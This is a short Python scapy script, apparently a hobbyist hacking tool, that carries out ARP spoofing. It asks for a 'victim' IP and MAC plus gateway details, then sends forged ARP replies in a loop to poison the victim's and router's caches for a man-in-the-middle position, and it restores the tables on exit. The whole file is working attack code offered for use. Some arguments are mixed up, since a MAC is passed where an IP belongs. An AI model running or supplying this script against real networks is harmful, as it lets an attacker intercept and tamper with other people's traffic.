
import scapy.all as scapy
import time
import sys 


print("\033[33;1m                  [+] this tool was coded by Abo Ahmad Lb     ")



target_ip = input('{+}enter your victim ip : ')
target_mac = input('{+}enter your target mac : ')
spoof_ip = input('{+}enter your gateway ip : ') 
gateway_ip = input("{+}enter your router mac : ")


def restore(target_ip, target_mac ):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=gateway_ip)
    scapy.send(packet, count=4, verbose=False)




def spoof(target_ip, spoof_ip):
    
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


sent_packets_count = 0

try:
    while True:
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip, target_mac)
        sent_packets_count =  sent_packets_count + 2 
        print("\r{+}Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n{+}Pressing CTRL + C .....\n  [ restoring arp tables]")
    restore(target_ip, spoof_ip)
    restore(spoof_ip, target_ip)

